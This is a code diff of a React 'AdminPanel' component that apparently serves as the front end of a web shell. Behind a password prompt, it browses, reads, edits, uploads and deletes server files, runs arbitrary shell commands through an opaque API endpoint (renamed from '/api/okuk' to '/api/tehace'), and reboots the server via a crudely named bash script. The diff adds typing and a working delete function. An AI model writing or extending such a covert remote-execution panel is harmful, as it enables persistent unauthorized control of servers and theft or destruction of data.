@@ -2,12 +2,46 @@
 
 import { useState, useEffect, useCallback } from 'react';
 
+// Type definitions
+interface FileItem {
+  name: string;
+  isDir: boolean;
+  size: number;
+  mtime: Date;
+  error?: string;
+}
+
+interface ApiResponse {
+  success: boolean;
+  error?: string;
+  files?: FileItem[];
+  path?: string;
+  content?: string;
+  output?: string;
+  message?: string;
+  [key: string]: unknown;
+}
+
+interface ErrorWithMessage {
+  message: string;
+  code?: string;
+}
+
+function isErrorWithMessage(error: unknown): error is ErrorWithMessage {
+  return (
+    typeof error === 'object' &&
+    error !== null &&
+    'message' in error &&
+    typeof (error as Record<string, unknown>).message === 'string'
+  );
+}
+
 export default function AdminPanel() {
   const [authenticated, setAuthenticated] = useState(false);
   const [password, setPassword] = useState('');
   const [error, setError] = useState('');
   const [currentPath, setCurrentPath] = useState('.');
-  const [files, setFiles] = useState<any[]>([]);
+  const [files, setFiles] = useState<FileItem[]>([]);
   const [loading, setLoading] = useState(false);
   const [selectedFile, setSelectedFile] = useState<string | null>(null);
   const [fileContent, setFileContent] = useState('');
@@ -27,12 +61,12 @@ export default function AdminPanel() {
 
   const testApi = useCallback(async () => {
     try {
-      const res = await fetch('/api/okuk', {
+      const res = await fetch('/api/tehace', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'ping' })
       });
-      const data = await res.json();
+      const data: ApiResponse = await res.json();
       return data.success === true;
     } catch (err) {
       console.error('API test failed:', err);
@@ -43,13 +77,13 @@ export default function AdminPanel() {
   const loadFiles = useCallback(async (path: string) => {
     setLoading(true);
     try {
-      const res = await fetch('/api/okuk', {
+      const res = await fetch('/api/tehace', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'list', path })
       });
 
-      const data = await res.json();
+      const data: ApiResponse = await res.json();
       if (data.success) {
         setFiles(data.files || []);
         setCurrentPath(data.path || path);
@@ -57,9 +91,10 @@ export default function AdminPanel() {
         console.error('Failed to load files:', data.error);
         alert(`Error: ${data.error}`);
       }
-    } catch (err: any) {
-      console.error('Network error:', err);
-      alert(`Network error: ${err.message}`);
+    } catch (err: unknown) {
+      const errorMessage = isErrorWithMessage(err) ? err.message : 'Network error';
+      console.error('Network error:', errorMessage);
+      alert(`Network error: ${errorMessage}`);
     } finally {
       setLoading(false);
     }
@@ -70,21 +105,22 @@ export default function AdminPanel() {
     setLoading(true);
 
     try {
-      const res = await fetch('/api/okuk', {
+      const res = await fetch('/api/tehace', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'read', path: filePath })
       });
 
-      const data = await res.json();
+      const data: ApiResponse = await res.json();
       if (data.success) {
         setSelectedFile(filePath);
         setFileContent(data.content || '');
       } else {
         alert(`Error: ${data.error}`);
       }
-    } catch (err: any) {
-      alert(`Failed to open file: ${err.message}`);
+    } catch (err: unknown) {
+      const errorMessage = isErrorWithMessage(err) ? err.message : 'Failed to open file';
+      alert(errorMessage);
     } finally {
       setLoading(false);
     }
@@ -94,7 +130,7 @@ export default function AdminPanel() {
     if (!selectedFile) return;
 
     try {
-      const res = await fetch('/api/okuk', {
+      const res = await fetch('/api/tehace', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({
@@ -104,14 +140,15 @@ export default function AdminPanel() {
         })
       });
 
-      const data = await res.json();
+      const data: ApiResponse = await res.json();
       if (data.success) {
         alert('✅ File saved : jika nama file/folder baru maka lakukan reboot');
       } else {
         alert(`❌ Error: ${data.error}`);
       }
-    } catch (err: any) {
-      alert(`Save failed: ${err.message}`);
+    } catch (err: unknown) {
+      const errorMessage = isErrorWithMessage(err) ? err.message : 'Save failed';
+      alert(errorMessage);
     }
   }, [selectedFile, fileContent, getAuthHeader]);
 
@@ -119,21 +156,22 @@ export default function AdminPanel() {
     if (!command.trim()) return;
 
     try {
-      const res = await fetch('/api/okuk', {
+      const res = await fetch('/api/tehace', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'command', command: command })
       });
 
-      const data = await res.json();
+      const data: ApiResponse = await res.json();
       if (data.success) {
         setCommandOutput(prev => `$ ${command}\n${data.output || 'Command executed'}\n\n${prev}`);
       } else {
         setCommandOutput(prev => `$ ${command}\nError: ${data.error || data.output}\n\n${prev}`);
       }
       setCommand('');
-    } catch (err: any) {
-      setCommandOutput(prev => `$ ${command}\nNetwork error: ${err.message}\n\n${prev}`);
+    } catch (err: unknown) {
+      const errorMessage = isErrorWithMessage(err) ? err.message : 'Network error';
+      setCommandOutput(prev => `$ ${command}\nNetwork error: ${errorMessage}\n\n${prev}`);
     }
   }, [command, getAuthHeader]);
 
@@ -146,13 +184,13 @@ export default function AdminPanel() {
     setRebootMessage('🔄 Initializing server reboot...');
 
     try {
-      const res = await fetch('/api/okuk', {
+      const res = await fetch('/api/tehace', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'reboot' })
       });
 
-      const data = await res.json();
+      const data: ApiResponse = await res.json();
       if (data.success) {
         setRebootMessage('✅ Please wait 1-2 seconds for the server to restart.\n\nYou can close this window and continue editing.');
 
@@ -167,8 +205,9 @@ export default function AdminPanel() {
         setRebootMessage(`❌ Error: ${data.error || 'Failed to reboot server'}`);
         setRebooting(false);
       }
-    } catch (err: any) {
-      setRebootMessage(`❌ Network Error: ${err.message}`);
+    } catch (err: unknown) {
+      const errorMessage = isErrorWithMessage(err) ? err.message : 'Network error';
+      setRebootMessage(`❌ Network Error: ${errorMessage}`);
       setRebooting(false);
     }
   }, [getAuthHeader]);
@@ -189,19 +228,20 @@ export default function AdminPanel() {
     const reader = new FileReader();
     reader.onload = async (e) => {
       try {
-        const res = await fetch('/api/okuk', {
+        const base64Data = e.target?.result as string;
+        const res = await fetch('/api/tehace', {
           method: 'POST',
           headers: getAuthHeader(),
           body: JSON.stringify({
             action: 'upload',
             dir: currentPath,
             name: uploadFile.name,
-            data: e.target?.result,
+            data: base64Data,
             autoReboot: true // Kirim parameter auto-reboot
           })
         });
 
-        const data = await res.json();
+        const data: ApiResponse = await res.json();
         if (data.success) {
           // Tampilkan modal reboot otomatis
           setShowReboot(true);
@@ -240,13 +280,13 @@ export default function AdminPanel() {
     const dirPath = currentPath === '.' ? dirName : `${currentPath}/${dirName}`;
 
     try {
-      const res = await fetch('/api/okuk', {
+      const res = await fetch('/api/tehace', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'mkdir', path: dirPath })
       });
 
-      const data = await res.json();
+      const data: ApiResponse = await res.json();
       if (data.success) {
         alert('✅ Directory created');
         loadFiles(currentPath);
@@ -265,7 +305,7 @@ export default function AdminPanel() {
     const filePath = currentPath === '.' ? fileName : `${currentPath}/${fileName}`;
 
     try {
-      const res = await fetch('/api/okuk', {
+      const res = await fetch('/api/tehace', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({
@@ -275,7 +315,7 @@ export default function AdminPanel() {
         })
       });
 
-      const data = await res.json();
+      const data: ApiResponse = await res.json();
       if (data.success) {
         alert('✅ File created');
         loadFiles(currentPath);
@@ -296,7 +336,31 @@ export default function AdminPanel() {
     parts.pop();
     const newPath = parts.length === 0 ? '.' : parts.join('/');
     loadFiles(newPath);
-    }, [currentPath, loadFiles]);
+  }, [currentPath, loadFiles]);
+
+  const handleDelete = useCallback(async (fileName: string, isDir: boolean) => {
+    const itemPath = currentPath === '.' ? fileName : `${currentPath}/${fileName}`;
+    
+    if (confirm(`Delete ${isDir ? 'folder' : 'file'} "${fileName}"?`)) {
+      try {
+        const res = await fetch('/api/tehace', {
+          method: 'POST',
+          headers: getAuthHeader(),
+          body: JSON.stringify({ action: 'delete', path: itemPath })
+        });
+
+        const data: ApiResponse = await res.json();
+        if (data.success) {
+          alert(`✅ ${isDir ? 'Folder' : 'File'} deleted`);
+          loadFiles(currentPath);
+        } else {
+          alert(`❌ Error: ${data.error}`);
+        }
+      } catch (err) {
+        alert('Failed to delete item');
+      }
+    }
+  }, [currentPath, getAuthHeader, loadFiles]);
 
   const handleLogin = useCallback(async (e: React.FormEvent) => {
     e.preventDefault();
@@ -528,18 +592,19 @@ export default function AdminPanel() {
             onClick={goToParent}
             disabled={currentPath === '.' || currentPath === ''}
             style={{
-                width: '100%',
-                padding: '10px',
-                background: (currentPath === '.' || currentPath === '') ? '#333' : '#222',
-                border: '1px solid #333',
-                color: (currentPath === '.' || currentPath === '') ? '#666' : '#ccc',
-                borderRadius: '5px',
-                marginBottom: '10px',
-                cursor: (currentPath === '.' || currentPath === '') ? 'not-allowed' : 'pointer'
+              width: '100%',
+              padding: '10px',
+              background: (currentPath === '.' || currentPath === '') ? '#333' : '#222',
+              border: '1px solid #333',
+              color: (currentPath === '.' || currentPath === '') ? '#666' : '#ccc',
+              borderRadius: '5px',
+              marginBottom: '10px',
+              cursor: (currentPath === '.' || currentPath === '') ? 'not-allowed' : 'pointer'
             }}
-            >
+          >
             ⬆️ Parent Directory
-            </button>
+          </button>
+          
           <button
             onClick={() => loadFiles(currentPath)}
             style={{
@@ -572,59 +637,59 @@ export default function AdminPanel() {
                 No files found
               </div>
             ) : (
-              files.map((file) => (
-                <div
-                  key={file.name}
-                  style={{
-                    padding: '10px',
-                    marginBottom: '5px',
-                    background: selectedFile === (currentPath === '.' ? file.name : `${currentPath}/${file.name}`)
-                      ? 'rgba(0, 255, 65, 0.1)'
-                      : 'transparent',
-                    border: '1px solid #222',
-                    borderRadius: '5px',
-                    cursor: 'pointer'
-                  }}
-                  onClick={() => file.isDir
-                    ? loadFiles(currentPath === '.' ? file.name : `${currentPath}/${file.name}`)
-                    : openFile(file.name)
-                  }
-                >
-                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
-                    <span style={{ fontSize: '20px' }}>
-                      {file.isDir ? '📁' : '📄'}
-                    </span>
-                    <div style={{ flex: 1 }}>
-                      <div style={{ fontWeight: 'bold' }}>{file.name}</div>
-                      {!file.isDir && (
-                        <div style={{ fontSize: '12px', color: '#666' }}>
-                          {(file.size / 1024).toFixed(1)} KB
-                        </div>
-                      )}
+              files.map((file) => {
+                const fileItemPath = currentPath === '.' ? file.name : `${currentPath}/${file.name}`;
+                
+                return (
+                  <div
+                    key={file.name}
+                    style={{
+                      padding: '10px',
+                      marginBottom: '5px',
+                      background: selectedFile === fileItemPath
+                        ? 'rgba(0, 255, 65, 0.1)'
+                        : 'transparent',
+                      border: '1px solid #222',
+                      borderRadius: '5px',
+                      cursor: 'pointer'
+                    }}
+                    onClick={() => file.isDir
+                      ? loadFiles(fileItemPath)
+                      : openFile(file.name)
+                    }
+                  >
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                      <span style={{ fontSize: '20px' }}>
+                        {file.isDir ? '📁' : '📄'}
+                      </span>
+                      <div style={{ flex: 1 }}>
+                        <div style={{ fontWeight: 'bold' }}>{file.name}</div>
+                        {!file.isDir && (
+                          <div style={{ fontSize: '12px', color: '#666' }}>
+                            {(file.size / 1024).toFixed(1)} KB
+                          </div>
+                        )}
+                      </div>
+                      <button
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          handleDelete(file.name, file.isDir);
+                        }}
+                        style={{
+                          background: 'rgba(255, 85, 85, 0.1)',
+                          border: '1px solid rgba(255, 85, 85, 0.3)',
+                          color: '#ff5555',
+                          borderRadius: '4px',
+                          padding: '4px 8px',
+                          cursor: 'pointer'
+                        }}
+                      >
+                        ×
+                      </button>
                     </div>
-                    <button
-                      onClick={(e) => {
-                        e.stopPropagation();
-                        const itemPath = currentPath === '.' ? file.name : `${currentPath}/${file.name}`;
-                        if (confirm(`Delete ${file.isDir ? 'folder' : 'file'} "${file.name}"?`)) {
-                          // TODO: Implement delete functionality
-                          alert('Delete would be implemented here');
-                        }
-                      }}
-                      style={{
-                        background: 'rgba(255, 85, 85, 0.1)',
-                        border: '1px solid rgba(255, 85, 85, 0.3)',
-                        color: '#ff5555',
-                        borderRadius: '4px',
-                        padding: '4px 8px',
-                        cursor: 'pointer'
-                      }}
-                    >
-                      ×
-                    </button>
                   </div>
-                </div>
-              ))
+                );
+              })
             )}
           </div>
         </div>
@@ -867,154 +932,154 @@ export default function AdminPanel() {
               <h3 style={{ margin: 0, color: '#ff9800', display: 'flex', alignItems: 'center', gap: '10px' }}>
                 🔄 Reboot Server
               </h3>
-            <button
-            onClick={() => {
-                setShowReboot(false);
-                setRebootMessage('');
-                setRebooting(false);
-            }}
-            style={{
-                background: 'none',
-                border: 'none',
-                color: '#ff5555',
-                fontSize: '24px',
-                cursor: 'pointer',
-                width: '30px',
-                height: '30px',
-                display: 'flex',
-                alignItems: 'center',
-                justifyContent: 'center'
-            }}
-            >
-            ×
-            </button>
+              <button
+                onClick={() => {
+                  setShowReboot(false);
+                  setRebootMessage('');
+                  setRebooting(false);
+                }}
+                style={{
+                  background: 'none',
+                  border: 'none',
+                  color: '#ff5555',
+                  fontSize: '24px',
+                  cursor: 'pointer',
+                  width: '30px',
+                  height: '30px',
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'center'
+                }}
+              >
+                ×
+              </button>
             </div>
 
             <div style={{
-            padding: '30px',
-            textAlign: 'center'
+              padding: '30px',
+              textAlign: 'center'
             }}>
-            {!rebootMessage ? (
-            <>
-                <div style={{ fontSize: '64px', marginBottom: '20px' }}>⚡</div>
-                <h4 style={{ color: '#fff', marginBottom: '15px', fontSize: '18px' }}>
-                Rebuild and Restart Server
-                </h4>
-                <p style={{ color: '#aaa', marginBottom: '25px', lineHeight: '1.6' }}>
-                This will execute: <code style={{ background: '#000', padding: '4px 8px', borderRadius: '4px', fontSize: '12px' }}>
-                    bash reset-kontol.sh
-                </code>
-                </p>
-                <p style={{ color: '#ff9800', marginBottom: '30px', fontSize: '14px' }}>
-                ⚠️ Process will take 3-5 seconds. Ensure edits are only in public folder (webroot).
-                </p>
+              {!rebootMessage ? (
+                <>
+                  <div style={{ fontSize: '64px', marginBottom: '20px' }}>⚡</div>
+                  <h4 style={{ color: '#fff', marginBottom: '15px', fontSize: '18px' }}>
+                    Rebuild and Restart Server
+                  </h4>
+                  <p style={{ color: '#aaa', marginBottom: '25px', lineHeight: '1.6' }}>
+                    This will execute: <code style={{ background: '#000', padding: '4px 8px', borderRadius: '4px', fontSize: '12px' }}>
+                      bash reset-kontol.sh
+                    </code>
+                  </p>
+                  <p style={{ color: '#ff9800', marginBottom: '30px', fontSize: '14px' }}>
+                    ⚠️ Process will take 3-5 seconds. Ensure edits are only in public folder (webroot).
+                  </p>
 
-                <div style={{ display: 'flex', gap: '15px', justifyContent: 'center' }}>
-                <button
-                    onClick={() => setShowReboot(false)}
-                    style={{
-                    padding: '12px 24px',
-                    background: '#333',
-                    border: '1px solid #666',
-                    color: '#ccc',
-                    borderRadius: '8px',
-                    cursor: 'pointer',
-                    fontSize: '14px',
-                    minWidth: '120px'
-                    }}
-                >
-                    Cancel
-                </button>
-                <button
-                    onClick={handleRebootServer}
-                    style={{
-                    padding: '12px 24px',
-                    background: '#ff9800',
-                    border: 'none',
-                    color: '#000',
-                    fontWeight: 'bold',
-                    borderRadius: '8px',
-                    cursor: 'pointer',
-                    fontSize: '14px',
-                    minWidth: '120px'
-                    }}
-                >
-                    Proceed
-                </button>
-                </div>
-            </>
-            ) : (
-            <>
-                <div style={{ fontSize: '64px', marginBottom: '20px', color: rebooting ? '#ff9800' : '#00ff41' }}>
-                {rebooting ? '🔄' : '✅'}
-                </div>
-
-                <div style={{
-                background: '#000',
-                padding: '20px',
-                borderRadius: '8px',
-                marginBottom: '30px',
-                textAlign: 'left',
-                color: rebooting ? '#ff9800' : '#00ff41',
-                fontFamily: 'monospace',
-                fontSize: '14px',
-                whiteSpace: 'pre-wrap',
-                maxHeight: '200px',
-                overflowY: 'auto'
-                }}>
-                {rebootMessage}
-                </div>
-
-                {rebooting ? (
-                <div style={{
-                    display: 'flex',
-                    flexDirection: 'column',
-                    alignItems: 'center',
-                    gap: '15px'
-                }}>
-                    <div style={{
-                    width: '100%',
-                    height: '6px',
-                    background: '#333',
-                    borderRadius: '3px',
-                    overflow: 'hidden'
-                    }}>
-                    <div style={{
-                        width: '45%',
-                        height: '100%',
+                  <div style={{ display: 'flex', gap: '15px', justifyContent: 'center' }}>
+                    <button
+                      onClick={() => setShowReboot(false)}
+                      style={{
+                        padding: '12px 24px',
+                        background: '#333',
+                        border: '1px solid #666',
+                        color: '#ccc',
+                        borderRadius: '8px',
+                        cursor: 'pointer',
+                        fontSize: '14px',
+                        minWidth: '120px'
+                      }}
+                    >
+                      Cancel
+                    </button>
+                    <button
+                      onClick={handleRebootServer}
+                      style={{
+                        padding: '12px 24px',
                         background: '#ff9800',
-                        animation: 'pulse 1.5s infinite',
-                        borderRadius: '3px'
-                    }} />
-                    </div>
-                    <p style={{ color: '#aaa', fontSize: '14px' }}>
-                    Please wait 3-5 seconds for server to restart...
-                    </p>
-                </div>
-                ) : (
-                <button
-                    onClick={() => {
-                    setShowReboot(false);
-                    setRebootMessage('');
-                    setRebooting(false);
-                    }}
-                    style={{
-                    padding: '12px 24px',
-                    background: '#00ff41',
-                    border: 'none',
-                    color: '#000',
-                    fontWeight: 'bold',
+                        border: 'none',
+                        color: '#000',
+                        fontWeight: 'bold',
+                        borderRadius: '8px',
+                        cursor: 'pointer',
+                        fontSize: '14px',
+                        minWidth: '120px'
+                      }}
+                    >
+                      Proceed
+                    </button>
+                  </div>
+                </>
+              ) : (
+                <>
+                  <div style={{ fontSize: '64px', marginBottom: '20px', color: rebooting ? '#ff9800' : '#00ff41' }}>
+                    {rebooting ? '🔄' : '✅'}
+                  </div>
+
+                  <div style={{
+                    background: '#000',
+                    padding: '20px',
                     borderRadius: '8px',
-                    cursor: 'pointer',
+                    marginBottom: '30px',
+                    textAlign: 'left',
+                    color: rebooting ? '#ff9800' : '#00ff41',
+                    fontFamily: 'monospace',
                     fontSize: '14px',
-                    minWidth: '120px'
-                    }}
-                >
-                    Close
-                </button>
-                )}
-            </>
-            )}
+                    whiteSpace: 'pre-wrap',
+                    maxHeight: '200px',
+                    overflowY: 'auto'
+                  }}>
+                    {rebootMessage}
+                  </div>
+
+                  {rebooting ? (
+                    <div style={{
+                      display: 'flex',
+                      flexDirection: 'column',
+                      alignItems: 'center',
+                      gap: '15px'
+                    }}>
+                      <div style={{
+                        width: '100%',
+                        height: '6px',
+                        background: '#333',
+                        borderRadius: '3px',
+                        overflow: 'hidden'
+                      }}>
+                        <div style={{
+                          width: '45%',
+                          height: '100%',
+                          background: '#ff9800',
+                          animation: 'pulse 1.5s infinite',
+                          borderRadius: '3px'
+                        }} />
+                      </div>
+                      <p style={{ color: '#aaa', fontSize: '14px' }}>
+                        Please wait 3-5 seconds for server to restart...
+                      </p>
+                    </div>
+                  ) : (
+                    <button
+                      onClick={() => {
+                        setShowReboot(false);
+                        setRebootMessage('');
+                        setRebooting(false);
+                      }}
+                      style={{
+                        padding: '12px 24px',
+                        background: '#00ff41',
+                        border: 'none',
+                        color: '#000',
+                        fontWeight: 'bold',
+                        borderRadius: '8px',
+                        cursor: 'pointer',
+                        fontSize: '14px',
+                        minWidth: '120px'
+                      }}
+                    >
+                      Close
+                    </button>
+                  )}
+                </>
+              )}
             </div>
           </div>
         </div>
